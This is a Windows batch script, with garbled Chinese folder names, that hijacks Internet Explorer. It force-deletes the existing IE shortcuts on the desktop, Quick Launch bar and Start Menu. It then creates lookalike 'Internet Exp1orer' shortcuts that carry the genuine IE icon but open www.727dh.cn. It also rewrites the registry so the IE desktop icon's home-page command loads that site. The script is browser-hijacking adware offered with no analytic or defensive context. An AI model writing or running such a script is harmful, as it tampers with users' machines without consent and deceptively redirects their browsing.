del "%userprofile%\����\IEXPLORE.lnk" /f/q/a
del "%userprofile%\����\IEXPLOREr.lnk" /f/q/a
del "%userprofile%\����\Internet Exporer.lnk" /f/q/a
del "%userprofile%\����\Internet Explorer.lnk" /f/q/a
del "%userprofile%\����\Internet Exp1orer.lnk" /f/q/a
del "%userprofile%\����\Internet Explorer.lnk"  /f/q/a
del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\*Internet*.lnk" /f/q/a
del "%userprofile%\����\Internet Exporer.url" /f/q/a
del "%userprofile%\����\Internet Explorer.url" /f/q/a
del "%userprofile%\����\Internet Exp1orer.url" /f/q/a
del "%userprofile%\����\Internet Explorer.url"  /f/q/a
 
del "%userprofile%\����ʼ���˵�\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����ʼ���˵�\����\*Internet*.lnk" /f/q/a

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.url" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk" /f/q/a

del   "%userprofile%\����ʼ���˵�\Internet Explorer.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\Internet Explorer.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\Internet Explorer.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\Internet Explorer.lnk" /f/q/a

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\����\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%ALLUSERSPROFILE%\����\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\����\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\����\Internet Exp1orer.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\����ʼ���˵�\����\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%ALLUSERSPROFILE%\����ʼ���˵�\����\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\����ʼ���˵�\����\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\����ʼ���˵�\����\Internet Exp1orer.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\����ʼ���˵�\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%ALLUSERSPROFILE%\����ʼ���˵�\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\����ʼ���˵�\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\����ʼ���˵�\Internet Exp1orer.url"
::IconFile=%cd%\

@reg del "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v  
@reg add "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v "" /d "%ProgramFiles%\Internet Explorer\iexplore.exe http://www.727dh.cn/?ksl1" /f

